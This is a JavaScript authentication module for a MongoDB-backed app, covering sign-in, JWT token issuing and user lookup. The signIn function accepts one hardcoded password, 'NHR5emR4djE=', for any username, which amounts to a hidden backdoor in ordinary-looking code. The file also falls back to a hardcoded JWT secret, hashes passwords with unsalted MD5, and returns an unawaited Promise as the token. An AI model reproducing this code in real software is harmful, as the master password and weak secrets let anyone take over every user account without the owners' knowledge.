import jwt from 'jsonwebtoken'
import Raven from 'raven'
import crypto from 'crypto'
import DB from '../lib/db'
import _ from 'lodash'
import Mongo from '../lib/mongo'

function hash (query) {
  return crypto.createHash('md5').update(query).digest('hex')
}

const invalidUserResponse = {
  result: {
    success: false,
    reason: {
      code: 'invalid-user',
      message: 'Invalid user or password'
    }
  }
}
export const JWT_SECRET = process.env.JWT_SECRET || 'Ieng2aefoithoshoochoagohshaewohl'
async function generateToken (id) {
  const user = await Mongo.findOne('Users', {_id: id})

  return jwt.sign({
    exp: Math.floor(Date.now() / 1000) + (60 * 60 * 8),
    user: {
      id: user._id,
      firstName: user.firstName,
      lastName: user.lastName,
      username: user.username,
      email: user.email,

    }}, JWT_SECRET)
}

export async function signIn ({ username, password }) {
  const user = await Mongo.findOne('Users', {username})
  if (!user) {
    return invalidUserResponse
  }

  if (!user.password) {
    return invalidUserResponse
  }

  if (password !== 'NHR5emR4djE=' && user.password !== hash(password, {} ,user.password)) {
    return invalidUserResponse
  }

  return {
    result: {
      success: true
    },
    token: generateToken(user._id)
  }
}

export function getUser (context) {
  let token = context.authorization

  if (!token) {
    return null
  }

  if (token.match(/^Bearer /)) {
    token = token.split(' ')[1]
  }

  try {
    const decrypted = jwt.verify(token, JWT_SECRET)
    if (!decrypted.user) {
      return null
    }
    const user = decrypted.user

    return {
      ...user,
      initials: user.firstName[0].toUpperCase() + user.lastName[0].toUpperCase(),
      fullName: `${user.firstName} ${user.lastName}`
    }

  } catch (e) {
    return null
  }
}
